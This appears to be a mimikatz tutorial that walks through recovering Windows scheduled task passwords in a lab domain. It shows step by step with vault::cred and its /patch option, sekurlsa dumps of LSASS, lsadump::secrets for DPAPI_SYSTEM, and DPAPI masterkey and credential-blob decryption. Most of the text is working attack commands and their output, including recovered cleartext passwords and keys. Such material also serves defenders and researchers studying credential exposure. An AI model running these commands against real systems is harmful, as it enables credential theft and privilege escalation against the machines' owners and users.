There are somes ways to get scheduled tasks passwords

## The bonus part
> yes, in first

Just after task creation, Windows will keep **a copy of the task credential in the owner credentials vault**
```
mimikatz # vault::cred
TargetName : LAB\admin / <NULL>
UserName   : LAB\admin
Comment    : <NULL>
Type       : 1 - generic
Persist    : 3 - enterprise
Flags      : 00000000
Credential : waza1234/a
Attributes : 0
```
Don't ask me why, I don't know :)  
But if you know, have an idea, please, poke me! (maybe to avoid asking credentials again when the owner makes modifications?)  
And of course, as it just has been used to create the task, `sekurlsa::credman` (or `::logonpasswords`) exposes it:
```
Authentication Id : 0 ; 183160 (00000000:0002cb78)
Session           : Interactive from 1
User Name         : Administrateur
Domain            : LAB
Logon Server      : DC-0
Logon Time        : 03/01/2017 22:27:52
SID               : S-1-5-21-412031729-2859336904-2073880905-500
        credman :
         [00000000]
         * Username : LAB\admin
         * Domain   : LAB\admin
         * Password : waza1234/a
```
### The bonus part of the bonus part
_Credentials are not deleted, even after deleting the scheduled task_, again, if you know why: please poke me!

## The credentials way
**just elevate to `SYSTEM` and ask for it** :)
```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : AUTORITE NT\Système

516     29627           AUTORITE NT\Système     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !
 * Process Token : 460706       LAB\Administrateur      S-1-5-21-412031729-2859336904-2073880905-500    (17g,24p)
Primary
 * Thread Token  : 529506       AUTORITE NT\Système     S-1-5-18        (04g,21p)       Impersonation (Delegation)

mimikatz # vault::cred
TargetName : Domain:batch=TaskScheduler:Task:{813565C4-C976-4E78-A1CA-8BDAE749E965} / <NULL>
UserName   : LAB\admin
Comment    : <NULL>
Type       : 2 - domain_password
Persist    : 2 - local_machine
Flags      : 00004004
Credential :
Attributes : 0
```

This time, Windows prevent credential exposition with `2 - domain_password` type.

![We must go deeper](http://www.quickmeme.com/img/e7/e7633bedf897bb24ce668ac9c5df6bf88a58ff7e114d27606a756f4c4888a3f1.jpg)

_Make tests before production_
```
mimikatz # vault::cred /patch
TargetName : Domain:batch=TaskScheduler:Task:{813565C4-C976-4E78-A1CA-8BDAE749E965} / <NULL>
UserName   : LAB\admin
Comment    : <NULL>
Type       : 2 - domain_password
Persist    : 2 - local_machine
Flags      : 00004004
Credential : waza1234/a
Attributes : 0
```
Bingo

## `DPAPI`ways
`SYSTEM` stores its saved credentials in `%systemroot%\System32\config\systemprofile\AppData\Local\Microsoft\Credentials`
```
C:\>dir /a %systemroot%\System32\config\systemprofile\AppData\Local\Microsoft\Credentials
 Le volume dans le lecteur C n’a pas de nom.
 Le numéro de série du volume est 9432-997D

 Répertoire de C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials

03/01/2017  22:31    <DIR>          .
03/01/2017  22:31    <DIR>          ..
03/01/2017  22:31               550 AA10EB8126AA20883E9542812A0F904C
```
Let's see what is inside:
```
mimikatz # dpapi::cred /in:%systemroot%\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\AA10EB8126AA20883E9542812A0F904C
**BLOB**
  dwVersion          : 00000001 - 1
  guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
  dwMasterKeyVersion : 00000001 - 1
  guidMasterKey      : {5d4e7e0d-d922-4783-8efc-9319b45b1c9a}
  dwFlags            : 20000000 - 536870912 (system ; )
  dwDescriptionLen   : 00000046 - 70
  szDescription      : Données d’identification locales
[...]
```
The masterkey needed to decrypt credential blob has the GUID: `{5d4e7e0d-d922-4783-8efc-9319b45b1c9a}`.

### _I'm feeling lucky_
There is a good chance that `LSASS` process has the key in its cache:
```
mimikatz # sekurlsa::dpapi
[...]
Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : PC-1$
Domain            : LAB
Logon Server      : (null)
Logon Time        : 03/01/2017 22:27:19
SID               : S-1-5-18
         [00000000]
         * GUID      :  {8f530ba2-f7ef-404d-a2b6-eecacb39d1fc}
         * Time      :  03/01/2017 22:27:20
         * MasterKey :  a8aa830045e30c98346c44815ded47ea7ec387a20e4924cb7e1f711d551bfd1c12d0e201ee6f2811cd13f3f4f7269cfe7b3064a27d4cdfd238f0a8c79730e223
         * sha1(key) :  9c30270221bf61d48438ae9f13f579d498c93b09
         [00000001]
         * GUID      :  {5d4e7e0d-d922-4783-8efc-9319b45b1c9a}
         * Time      :  03/01/2017 22:31:30
         * MasterKey :  0a942e9dfc934246081ed23f371c42fc0f9fcb6dcd3285ac210cd64c26dec3adc120eee7abdd56c68acd051850fd923380bc2e3a1558354eac53c2da6e73bbce
         * sha1(key) :  ba02ef86f26c683858d3df3dc961e37b0d47e574
[...]
```
As `mimikatz` loves you, it "auto-adds" masterkeys in a volatile cache:
```
mimikatz # dpapi::cred /in:%systemroot%\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\AA10EB8126AA20883E9542812A0F904C
**BLOB**
  dwVersion          : 00000001 - 1
  guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
  dwMasterKeyVersion : 00000001 - 1
  guidMasterKey      : {5d4e7e0d-d922-4783-8efc-9319b45b1c9a}
  dwFlags            : 20000000 - 536870912 (system ; )
  dwDescriptionLen   : 00000046 - 70
  szDescription      : Données d’identification locales
[...]
Decrypting Credential:
 * volatile cache: GUID:{5d4e7e0d-d922-4783-8efc-9319b45b1c9a};KeyHash:ba02ef86f26c683858d3df3dc961e37b0d47e574
**CREDENTIAL**
  credFlags      : 00000030 - 48
  credSize       : 000000fe - 254
  credUnk0       : 00004004 - 16388

  Type           : 00000002 - 2 - domain_password
  Flags          : 00000000 - 0
  LastWritten    : 03/01/2017 21:31:30
  unkFlagsOrSize : 00000018 - 24
  Persist        : 00000002 - 2 - local_machine
  AttributeCount : 00000000 - 0
  unk0           : 00000000 - 0
  unk1           : 00000000 - 0
  TargetName     : Domain:batch=TaskScheduler:Task:{813565C4-C976-4E78-A1CA-8BDAE749E965}
  UnkData        : (null)
  Comment        : (null)
  TargetAlias    : (null)
  UserName       : LAB\admin
  CredentialBlob : waza1234/a
  Attributes     : 0
```
![Doge](https://i.imgflip.com/1h19rs.jpg)

But you can, of course, use the masterkey by yourself: `dpapi::cred /in:%systemroot%\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\AA10EB8126AA20883E9542812A0F904C /masterkey:0a942e9dfc934246081ed23f371c42fc0f9fcb6dcd3285ac210cd64c26dec3adc120eee7abdd56c68acd051850fd923380bc2e3a1558354eac53c2da6e73bbce`

### _I'm feeling unlucky_ or _Let's make it "offline"_
Maybe no key in cache, or just access to files offline  
You need `DPAPI_SYSTEM`, user part, to decrypt the masterkey file on the disk to decrypt secret. You can make it online, or offline, both works:

#### Online:
```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : AUTORITE NT\Système

516     29627           AUTORITE NT\Système     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !
 * Process Token : 800606       LAB\Administrateur      S-1-5-21-412031729-2859336904-2073880905-500    (17g,24p)
Primary
 * Thread Token  : 802683       AUTORITE NT\Système     S-1-5-18        (04g,21p)       Impersonation (Delegation)

mimikatz # lsadump::secrets
Domain : PC-1
SysKey : d26ea7aef1e3896f240050a5890bfaba

Local name : PC-1 ( S-1-5-21-618257482-3585752924-2892384645 )
Domain name : LAB ( S-1-5-21-412031729-2859336904-2073880905 )
Domain FQDN : lab.local

Policy subsystem is : 1.14
LSA Key(s) : 1, default {6c64c5e5-041d-37d7-0fe0-315eb212f3cc}
  [00] {6c64c5e5-041d-37d7-0fe0-315eb212f3cc} 354c1f19ceecc072795a1ba4baa860adac8102c8597ecb882180c94e0176d932
[...]
Secret  : DPAPI_SYSTEM
cur/hex : 01 00 00 00 eb fd fc 4e f8 cd e8 38 3a e2 98 38 cf c5 bb 75 ba 29 46 55 c8 9e 39 64 4a 0b 05 aa 3b 39 39 c8 32 02 82 f8 57 d9 18 2c
    full: ebfdfc4ef8cde8383ae29838cfc5bb75ba294655c89e39644a0b05aa3b3939c8320282f857d9182c
    m/u : ebfdfc4ef8cde8383ae29838cfc5bb75ba294655 / c89e39644a0b05aa3b3939c8320282f857d9182c
old/hex :[...]
```
#### Offline
```
mimikatz # lsadump::secrets /system:c:\backup\SYSTEM /security:c:\backup\SECURITY
Domain : PC-1
SysKey : d26ea7aef1e3896f240050a5890bfaba

Local name : PC-1 ( S-1-5-21-618257482-3585752924-2892384645 )
Domain name : LAB ( S-1-5-21-412031729-2859336904-2073880905 )
Domain FQDN : lab.local

Policy subsystem is : 1.14
LSA Key(s) : 1, default {6c64c5e5-041d-37d7-0fe0-315eb212f3cc}
  [00] {6c64c5e5-041d-37d7-0fe0-315eb212f3cc} 354c1f19ceecc072795a1ba4baa860adac8102c8597ecb882180c94e0176d932
[...]
Secret  : DPAPI_SYSTEM
cur/hex : 01 00 00 00 eb fd fc 4e f8 cd e8 38 3a e2 98 38 cf c5 bb 75 ba 29 46 55 c8 9e 39 64 4a 0b 05 aa 3b 39 39 c8 32 02 82 f8 57 d9 18 2c
    full: ebfdfc4ef8cde8383ae29838cfc5bb75ba294655c89e39644a0b05aa3b3939c8320282f857d9182c
    m/u : ebfdfc4ef8cde8383ae29838cfc5bb75ba294655 / c89e39644a0b05aa3b3939c8320282f857d9182c
old/hex :[...]
```

Of course, in both cases, user part of `DPAPI_SYSTEM` is same: `c89e39644a0b05aa3b3939c8320282f857d9182c`

System masterkeys for users are in: `%systemroot%\System32\Microsoft\Protect\S-1-5-18\User`. Let's decrypt the intersting one:
```
mimikatz # dpapi::masterkey /in:%systemroot%\System32\Microsoft\Protect\S-1-5-18\User\5d4e7e0d-d922-4783-8efc-9319b45b1c9a /system:c89e39644a0b05aa3b3939c8320282f857d9182c
**MASTERKEYS**
  dwVersion          : 00000002 - 2
  szGuid             : {5d4e7e0d-d922-4783-8efc-9319b45b1c9a}
[...]
[masterkey]
  **MASTERKEY**
    dwVersion        : 00000002 - 2
    salt             : 8a2c5dcdbf5ffb9afd3ee457ec10293a
    rounds           : 00001f40 - 8000
    algHash          : 0000800e - 32782 (CALG_SHA_512)
    algCrypt         : 00006610 - 26128 (CALG_AES_256)
    pbKey            : 139cba79257390e1bf488b0d74db6d814afa325f055c54dddb8b18c8a344337f39e9b092386f74e90253c1d86d40fa5ce5d8e1a5a12dd7f30601873673e59a2ec5ad376c9fd1e0a131bb4799057ccaed0e944ff144c6b6cadb5d1d6bdd56ab0c8104afdf7601546df551da41f987da0aea1381346d9e8a529598333c1af1e142f45798b3357d8167b13ebd1acd83a5eb
[...]
[masterkey] with DPAPI_SYSTEM: c89e39644a0b05aa3b3939c8320282f857d9182c
  key : 0a942e9dfc934246081ed23f371c42fc0f9fcb6dcd3285ac210cd64c26dec3adc120eee7abdd56c68acd051850fd923380bc2e3a1558354eac53c2da6e73bbce
  sha1: ba02ef86f26c683858d3df3dc961e37b0d47e574
```
As `mimikatz` still loves you, masterkey key is still pushed into the cache
```
mimikatz # dpapi::cred /in:%systemroot%\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\AA10EB8126AA20883E9542812A0F904C
**BLOB**
  dwVersion          : 00000001 - 1
  guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
  dwMasterKeyVersion : 00000001 - 1
  guidMasterKey      : {5d4e7e0d-d922-4783-8efc-9319b45b1c9a}
  dwFlags            : 20000000 - 536870912 (system ; )
  dwDescriptionLen   : 00000046 - 70
  szDescription      : Données d’identification locales
[...]
Decrypting Credential:
 * volatile cache: GUID:{5d4e7e0d-d922-4783-8efc-9319b45b1c9a};KeyHash:ba02ef86f26c683858d3df3dc961e37b0d47e574
**CREDENTIAL**
  credFlags      : 00000030 - 48
  credSize       : 000000fe - 254
  credUnk0       : 00004004 - 16388

  Type           : 00000002 - 2 - domain_password
  Flags          : 00000000 - 0
  LastWritten    : 03/01/2017 21:31:30
  unkFlagsOrSize : 00000018 - 24
  Persist        : 00000002 - 2 - local_machine
  AttributeCount : 00000000 - 0
  unk0           : 00000000 - 0
  unk1           : 00000000 - 0
  TargetName     : Domain:batch=TaskScheduler:Task:{813565C4-C976-4E78-A1CA-8BDAE749E965}
  UnkData        : (null)
  Comment        : (null)
  TargetAlias    : (null)
  UserName       : LAB\admin
  CredentialBlob : waza1234/a
  Attributes     : 0
```
![funky](https://content6.flixster.com/question/36/66/11/3666116_std.jpg)